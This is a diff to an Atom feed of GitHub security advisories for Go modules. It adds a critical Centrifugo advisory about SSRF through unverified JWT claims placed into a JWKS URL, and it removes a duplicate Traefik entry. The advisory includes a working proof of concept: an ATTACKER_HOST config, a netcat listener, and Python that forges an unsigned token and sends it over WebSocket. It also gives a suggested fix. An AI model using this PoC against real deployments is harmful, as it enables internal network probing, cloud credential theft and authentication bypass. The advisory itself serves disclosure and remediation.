@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-13T19:10:55.917Z</updated>
+    <updated>2026-03-13T20:04:29.792Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,115 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/centrifugal/centrifugo/v6] Centrifugo: SSRF via unverified JWT claims interpolated into dynamic JWKS endpoint URL]]></title>
+        <id>https://github.com/advisories/GHSA-j77h-rr39-c552</id>
+        <link href="https://github.com/advisories/GHSA-j77h-rr39-c552"/>
+        <updated>2026-03-13T20:03:25.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Centrifugo is vulnerable to Server-Side Request Forgery (SSRF) when configured with a dynamic JWKS endpoint URL using template variables (e.g. <code>{{tenant}}</code>). An unauthenticated attacker can craft a JWT with a malicious <code>iss</code> or <code>aud</code> claim value that gets interpolated into the JWKS fetch URL <strong>before the token signature is verified</strong>, causing Centrifugo to make an outbound HTTP request to an attacker-controlled destination.</p>
+<h3 id="details">Details</h3>
+<p>In <code>internal/jwtverify/token_verifier_jwt.go</code>, the functions <code>VerifyConnectToken</code> and <code>VerifySubscribeToken</code> follow this flawed order of operations:</p>
+<ol>
+<li>Token is parsed without verification: <code>jwt.ParseNoVerify([]byte(t))</code></li>
+<li>Claims are decoded from the unverified token</li>
+<li><code>validateClaims()</code> runs — extracting named regex capture groups from 
+<code>issuer_regex</code>/<code>audience_regex</code> into <code>tokenVars</code> map using attacker-controlled 
+<code>iss</code>/<code>aud</code> claim values</li>
+<li><code>verifySignatureByJWK(token, tokenVars)</code> is called — passing attacker-controlled 
+<code>tokenVars</code> to the JWKS manager</li>
+<li>In <code>internal/jwks/manager.go</code>, <code>fetchKey()</code> interpolates <code>tokenVars</code> directly 
+into the JWKS URL:
+<code>jwkURL := m.url.ExecuteString(tokenVars)</code></li>
+<li>Centrifugo makes an HTTP GET request to the attacker-controlled URL</li>
+</ol>
+<p>Suppressed the security linter on this line with an incorrect comment:
+<code>//nolint:gosec // URL is from server configuration, not user input.</code>
+The URL is NOT purely from server configuration — it is partially constructed from unverified user-supplied JWT claims.</p>
+<p>Signature verification happens too late — after the SSRF has already fired.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Required config</strong> (<code>config.json</code>):</p>
+<pre><code class="language-json">{
+  "client": {
+    "token": {
+      "jwks_public_endpoint": "http://ATTACKER_HOST:8888/{{tenant}}/.well-known/jwks.json",
+      "issuer_regex": "^(?P[a-zA-Z0-9_-]+)\\.auth\\.example\\.com$"
+    }
+  },
+  "http_api": { "key": "test-api-key" }
+}
+</code></pre>
+<p><strong>Step 1</strong> — Start listener on attacker machine:</p>
+<pre><code>nc -lvnp 8888
+</code></pre>
+<p><strong>Step 2</strong> — Generate malicious unsigned JWT:</p>
+<pre><code class="language-python">import base64, json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header  = b'{"alg":"RS256","kid":"test-kid","typ":"JWT"}'
+payload = b'{"sub":"attacker","iss":"evil-tenant.auth.example.com","exp":9999999999}'
+token   = f"{b64url(header)}.{b64url(payload)}.fakesig"
+print(token)
+</code></pre>
+<p><strong>Step 3</strong> — Connect to Centrifugo WebSocket with the malicious token:</p>
+<pre><code class="language-python">import websocket, json
+ws = websocket.create_connection("ws://TARGET:8000/connection/websocket")
+ws.send(json.dumps({"id": 1, "connect": {"token": ""}}))
+print(ws.recv())
+</code></pre>
+<p><strong>Step 4</strong> — Observe incoming HTTP request on attacker listener:</p>
+<pre><code>GET /evil-tenant/.well-known/jwks.json HTTP/1.1
+Host: ATTACKER_HOST:8888
+User-Agent: Go-http-client/1.1
+</code></pre>
+<p>Malicious token being crafted with suppress_origin=True bypassing the 403, and the token sent to Centrifugo:
+<img src="https://github.com/user-attachments/assets/6fd5d5b8-f47a-4899-94db-931f52504808" alt="1"></p>
+<p>Centrifugo Server Log:
+<img src="https://github.com/user-attachments/assets/2e802648-8dc9-40d7-ac9e-f5f2ca19acad" alt="2"></p>
+<p>netcat terminal:
+<img src="https://github.com/user-attachments/assets/854cfb19-ed0c-44e2-977a-efe2f9b6c50a" alt="3"></p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Unauthenticated SSRF</strong> — No valid credentials required</li>
+<li>Attacker can probe and access internal network services not exposed externally</li>
+<li>On cloud deployments: access to metadata endpoints (AWS: <code>169.254.169.254</code>, GCP: <code>metadata.google.internal</code>) to steal IAM credentials</li>
+<li>Attacker can serve a malicious JWKS response containing their own public key, causing Centrifugo to accept attacker-signed tokens as legitimate — leading to <strong>full authentication bypass</strong></li>
+<li>Exploitation requires <code>jwks_public_endpoint</code> to contain <code>{{...}}</code> template variables combined with <code>issuer_regex</code> or <code>audience_regex</code> — a configuration pattern explicitly documented and promoted by Centrifugo</li>
+</ul>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p><strong>1. Verify signature BEFORE extracting tokenVars (critical fix):</strong>
+In <code>token_verifier_jwt.go</code>, swap the order of operations:</p>
+<pre><code class="language-go">// CURRENT (vulnerable) order:
+// 1. ParseNoVerify
+// 2. validateClaims() → populates tokenVars from unverified claims
+// 3. verifySignature(token, tokenVars)  ← too late
+
+// FIXED order:
+// 1. ParseNoVerify
+// 2. verifySignature(token)  ← verify first with empty/nil tokenVars
+// 3. validateClaims() → only now extract tokenVars from verified claims
+// 4. If JWKS needed, re-verify with tokenVars using verified kid only
+</code></pre>
+<p><strong>2. Fix the incorrect nolint comment in <code>manager.go</code>:</strong>
+Remove <code>//nolint:gosec // URL is from server configuration, not user input</code> The URL IS partially constructed from user input via JWT claims.</p>
+<p><strong>3. Alternative mitigation:</strong>
+Restrict template variables to only the <code>kid</code> header field (which is not claim data) rather than allowing arbitrary claim values to influence the JWKS URL.</p>
+<pre><code>### References
+
+- &lt;https://github.com/centrifugal/centrifugo/security/advisories/GHSA-j77h-rr39-c552&gt;
+- &lt;https://github.com/advisories/GHSA-j77h-rr39-c552&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j77h-rr39-c552</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-13T20:03:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/forceu/gokapi] Gokapi's File Request MaxSize Limit Bypassed via Multi-Chunk Upload]]></title>
         <id>https://github.com/advisories/GHSA-45vh-rpc8-hxpp</id>
@@ -1119,40 +1228,6 @@ Oleh Konko</p>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik: HTTP/2 frames can cause a running server to panic]]></title>
-        <id>https://github.com/advisories/GHSA-4hjq-9h5c-252j</id>
-        <link href="https://github.com/advisories/GHSA-4hjq-9h5c-252j"/>
-        <updated>2026-03-12T14:48:03.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>More Details:</p>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27141">https://nvd.nist.gov/vuln/detail/CVE-2026-27141</a></li>
-<li><a href="https://pkg.go.dev/golang.org/x/net/http2?tab=versions">https://pkg.go.dev/golang.org/x/net/http2?tab=versions</a></li>
-</ul>
-<h2 id="patches">Patches</h2>
-<ul>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.10">https://github.com/traefik/traefik/releases/tag/v3.6.10</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.40">https://github.com/traefik/traefik/releases/tag/v2.11.40</a></li>
-</ul>
-<h2 id="for-more-information">For more information</h2>
-<p>If you have any questions or comments about this advisory, please <a href="https://github.com/traefik/traefik/issues">open an issue</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-4hjq-9h5c-252j">https://github.com/traefik/traefik/security/advisories/GHSA-4hjq-9h5c-252j</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.40">https://github.com/traefik/traefik/releases/tag/v2.11.40</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.10">https://github.com/traefik/traefik/releases/tag/v3.6.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-4hjq-9h5c-252j">https://github.com/advisories/GHSA-4hjq-9h5c-252j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4hjq-9h5c-252j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-12T14:48:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] Traefik: HTTP/2 frames can cause a running server to panic]]></title>
         <id>https://github.com/advisories/GHSA-4hjq-9h5c-252j</id>
         <link href="https://github.com/advisories/GHSA-4hjq-9h5c-252j"/>
         <updated>2026-03-12T14:48:03.000Z</updated>
